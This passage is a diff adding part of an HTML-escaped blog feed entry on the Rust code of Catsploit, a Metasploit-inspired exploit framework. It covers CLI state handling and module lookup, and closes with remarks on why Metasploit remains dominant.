+        &lt;span class=&quot;nn&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;match&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cli&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.get_user_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;Ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;Err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nd&quot;&gt;println!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;match&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cli&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.handle_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;Ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prompt_change&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prompt_change&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;Err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nd&quot;&gt;println!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;holding-cli-state-in-memory&quot;&gt;Holding CLI state in memory&lt;/h3&gt;
+
+&lt;p&gt;The approach I’ve chosen for this is something close to OOP, which in Rust’s case is a struct type with methods defined on it. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cli&lt;/code&gt; struct is defined with all the state it needs, with all of them put inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Option&lt;/code&gt; so they can each be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;None&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Some(T)&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pub struct Cli {
+    pub prompt: Option&amp;lt;String&amp;gt;,
+    pub selected_module_kind: Option&amp;lt;Kind&amp;gt;,
+    pub selected_module_path: Option&amp;lt;String&amp;gt;,
+    pub selected_module_opts: Option&amp;lt;Vec&amp;lt;Opt&amp;gt;&amp;gt;,
+    pub previous_module_opts: HashMap&amp;lt;String, Vec&amp;lt;Opt&amp;gt;&amp;gt;,
+    pub displayed_list: HashMap&amp;lt;usize, String&amp;gt;,
+
+    pub auxiliary: Option&amp;lt;Box&amp;lt;dyn Auxiliary + Send + Sync&amp;gt;&amp;gt;,
+    pub auxiliary_info: Option&amp;lt;auxiliary::Info&amp;gt;,
+
+    pub exploit: Option&amp;lt;Box&amp;lt;dyn Exploit&amp;gt;&amp;gt;,
+    pub exploit_info: Option&amp;lt;exploit::Info&amp;gt;,
+    pub exploit_payload: Option&amp;lt;Box&amp;lt;dyn Payload + Send + Sync&amp;gt;&amp;gt;,
+
+    pub payload: Option&amp;lt;Box&amp;lt;dyn Payload + Send + Sync&amp;gt;&amp;gt;,
+    pub payload_info: Option&amp;lt;payload::Info&amp;gt;,
+}
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cli&lt;/code&gt; struct is used in a lot of different methods that take it as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;mut self&lt;/code&gt;. This is a mutable reference to the instance/object of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cli&lt;/code&gt; struct. Each of the below called methods can update the state of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cli&lt;/code&gt;, change a value like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit_info&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;None&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Some(exploit::Info)&lt;/code&gt; and so on:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impl Cli {
+  ...
+    pub fn handle_input(&amp;amp;mut self, input: UserInput) -&amp;gt; Result&amp;lt;(), Box&amp;lt;dyn Error&amp;gt;&amp;gt; {
+        match input.cmd.as_str() {
+            &quot;modules&quot; =&amp;gt; self.print_module_stats(),
+            &quot;show&quot; =&amp;gt; self.handle_show(input.subcmd)?,
+            &quot;info&quot; =&amp;gt; self.handle_info(input.subcmd)?,
+            &quot;use&quot; =&amp;gt; self.handle_use(input.subcmd)?,
+            &quot;set&quot; =&amp;gt; self.handle_set(input.subcmd, input.args)?,
+            &quot;run&quot; =&amp;gt; self.handle_run()?,
+            &quot;help&quot; =&amp;gt; Cli::handle_help(),
+            &quot;exit&quot; =&amp;gt; {
+                println!(&quot;Exiting...&quot;);
+                process::exit(0);
+            }
+            _ =&amp;gt; {
+                if !input.cmd.is_empty() {
+                    println!(&quot;Unknown command &apos;{}&apos;&quot;, input.cmd);
+                }
+            }
+        };
+        Ok(())
+    }
+  ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This provides a concise, in-memory and in-code way of storing state for an application such as this. A mistake I’ve made in the past is attempting to store state similar to this in parameters and return values instead of inside a struct/class. Both the caller and callee code can become messy quickly and the same parameters may be required for multiple functions:&lt;/p&gt;
+
+&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;change_exploits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Exploit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Sync&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionVec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Exploit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;// do something with exploits and return them&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Some&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;updated_exploits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;updated_exploits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;change_exploits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.unwrap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;For a system managing hundreds or thousands of pieces of state information, it may make sense to look instead for an out-of-code way of storing it such as SQLite etc. I believe its generally fine to just store state in-memory when its reasonable, and especially when it allows your application to forgo requiring a dependency such as a database.&lt;/p&gt;
+
+&lt;h3 id=&quot;hooking-into-the-library&quot;&gt;Hooking into the library&lt;/h3&gt;
+&lt;p&gt;The code for hooking into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catsploit_lib&lt;/code&gt; library is actually very simple:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use catsploit_lib::module::{index, Kind};
+
+...
+
+pub fn find_exploit(module_path: &amp;amp;str) -&amp;gt; Option&amp;lt;Box&amp;lt;dyn Exploit&amp;gt;&amp;gt; {
+    let exploits = index::exploits();
+    let mut selected_exploit: Option&amp;lt;Box&amp;lt;dyn Exploit&amp;gt;&amp;gt; = None;
+    for exploit in exploits {
+        if exploit.info().module_path == module_path {
+            selected_exploit = Some(exploit);
+        }
+    }
+    selected_exploit
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this application-side code the exploit index is from the library is called, and then iterated through to find which one matches a specific module path. With this code the CLI application can grab a specific exploit requested by the user, and then call any of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exploit&lt;/code&gt; trait methods on it such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit()&lt;/code&gt; to run it.&lt;/p&gt;
+
+&lt;p&gt;From this we can see how this library could be used in any Rust code - for example an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;axum&lt;/code&gt; webserver could be written were a user visits a webapp that allows them to view the exploits and run them.&lt;/p&gt;
+
+&lt;h2 id=&quot;on-exploit-frameworks-popularity&quot;&gt;On exploit frameworks popularity&lt;/h2&gt;
+&lt;p&gt;As seen by the description of the code for an exploit framework, it is clear that they rely on modules. Everyday new exploits are developed for new vulnerabilities, new payloads techniques are developed, new scanners, etc. Without an extensive open-source community and full-time employees behind it to write new modules on a regular basis the framework will rapidly become outdated.&lt;/p&gt;
+
+&lt;p&gt;When it comes to fuzzing tools for example you have a lot of quality tools to choose from: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fuzzapi&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;boofuzz&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syzkaller&lt;/code&gt; and you could go on and on. Many of these tools are not super actively developed either, as they often don’t need to be, once they’re written and tested they can work well for years. This is not the case for exploit frameworks.&lt;/p&gt;
+
+&lt;p&gt;For a generalists open-source exploit framework, realistically &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;metasploit-framework&lt;/code&gt; is the only option. There are a few other closed-source ones such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CORE IMPACT&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Immunity CANVAS&lt;/code&gt;, or browser exploitation frameworks such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BEeF&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;None of these cover the same breadth of Metasploit though, and I believe it would be nearly impossible to do so - the project has the most momentum in a field that relies on that.&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;Catsploit was a fun project to work on and develop, I learned a ton about Rust, Ruby, Exploits, Payloads and more. On reflection though  without constant work the project can never actually be useful to anyone, which is fine :)&lt;/p&gt;</content><author><name></name></author><category term="markdown" /><summary type="html">In an attempt to build a new open-source cybersecurity tool for my own usage and to build some experience, I developed Catsploit. Catsploit is an exploitation framework inspired by Metasploit. This post relates to the code itself, especially the modular requirements for an exploit framework, and discusses why Metasploit will probably remain king as the go-to open-source generalist exploit framework.</summary></entry></feed>
